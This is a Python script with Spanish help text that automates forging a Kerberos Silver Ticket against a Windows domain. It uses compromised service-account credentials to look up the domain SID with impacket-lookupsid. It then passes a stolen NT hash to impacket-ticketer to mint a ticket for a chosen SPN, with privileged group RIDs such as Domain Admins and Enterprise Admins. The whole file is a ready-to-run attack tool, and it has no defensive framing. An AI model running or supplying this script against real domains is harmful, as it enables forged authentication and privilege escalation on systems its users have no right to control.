#!/usr/bin/env python3
import argparse
import subprocess
import re
import sys

def print_custom_help():
    help_text = """
Uso:
  python3 silver_ticket_auto.py [OPCIONES]

Descripción:
  Automatiza la generación de un Silver Ticket para un SPN usando impacket-ticketer.
  Si no se especifica el SID, se intentará obtener con impacket-lookupsid.

Opciones principales:
  -t, --target       IP o hostname del Domain Controller (para obtener el SID)
  -u, --user         Usuario con SPN comprometido
  -p, --password     Contraseña del usuario (necesaria si se obtiene el SID)
  --domain           Nombre del dominio (ej: red.interna)
  --nt               NT hash del usuario SPN
  --spn              SPN objetivo (ej: MSSQLSvc/sql.red.interna:1433)
  --sid              SID del dominio (opcional si se puede obtener automáticamente)
  --groups           Lista de RIDs (por defecto: 513,512,520,518,519)
  --outfile          Nombre del archivo resultante (.ccache)

Ejemplo completo:
  python3 silver_ticket_auto.py \\
    -t 192.168.1.10 \\
    -u svc-sql \\
    -p 'Password123!' \\
    --domain red.interna \\
    --nt 11223344556677889900aabbccddeeff \\
    --spn MSSQLSvc/sql.red.interna:1433

También puedes usar un SID directamente:
  python3 silver_ticket_auto.py \\
    -u svc-sql \\
    --domain red.interna \\
    --nt 11223344556677889900aabbccddeeff \\
    --spn MSSQLSvc/sql.red.interna:1433 \\
    --sid S-1-5-21-1234567890-2345678901-3456789012

"""
    print(help_text)
    sys.exit(0)

def get_domain_sid(target, user, password, domain=None):
    print("[*] Obteniendo el SID del dominio con impacket-lookupsid...")
    cmd = ['impacket-lookupsid']
    if domain:
        cmd.append(f'{domain}/{user}:{password}@{target}')
    else:
        cmd.append(f'{user}:{password}@{target}')
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    sid_match = re.search(r'SID: (S-\d-\d+-(?:\d+-){1,14}\d+)', result.stdout)
    if sid_match:
        return sid_match.group(1)
    else:
        print("[-] No se pudo extraer el SID.")
        print(result.stdout)
        print(result.stderr)
        sys.exit(1)

def generate_ticket(domain, username, sid, nt_hash, spn, groups="513,512,520,518,519", output_file="silver_ticket.ccache"):
    print("[*] Generando Silver Ticket con impacket-ticketer...")
    cmd = [
        'impacket-ticketer',
        f'-nthash', nt_hash,
        f'-domain-sid', sid,
        f'-domain', domain,
        f'-user-id', '1000',
        f'-user', username,
        f'-spn', spn,
        f'-groups', groups,
        f'-outputfile', output_file
    ]
    subprocess.run(cmd)

def main():
    if '--help' in sys.argv or '-help' in sys.argv:
        print_custom_help()

    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-t', '--target', help='IP o hostname del DC (para obtener el SID)', required=False)
    parser.add_argument('-u', '--user', help='Usuario con SPN comprometido', required=True)
    parser.add_argument('-p', '--password', help='Contraseña del usuario (para obtener el SID)', required=False)
    parser.add_argument('--domain', help='Nombre del dominio', required=True)
    parser.add_argument('--nt', help='NT Hash del usuario SPN', required=True)
    parser.add_argument('--spn', help='SPN objetivo', required=True)
    parser.add_argument('--sid', help='SID del dominio (opcional si se obtiene con lookupsid)', required=False)
    parser.add_argument('--groups', help='Lista de RIDs (por defecto: 513,512,520,518,519)', default="513,512,520,518,519")
    parser.add_argument('--outfile', help='Nombre del archivo .ccache generado', default='silver_ticket.ccache')

    args = parser.parse_args()

    sid = args.sid
    if not sid:
        if not args.target or not args.password:
            print("[-] Si no se proporciona --sid, se requiere --target y --password.")
            sys.exit(1)
        sid = get_domain_sid(args.target, args.user, args.password, args.domain)
        print(f"[+] SID obtenido: {sid}")

    generate_ticket(args.domain, args.user, sid, args.nt, args.spn, args.groups, args.outfile)
    print(f"[+] Ticket generado exitosamente: {args.outfile}")

if __name__ == "__main__":
    main()
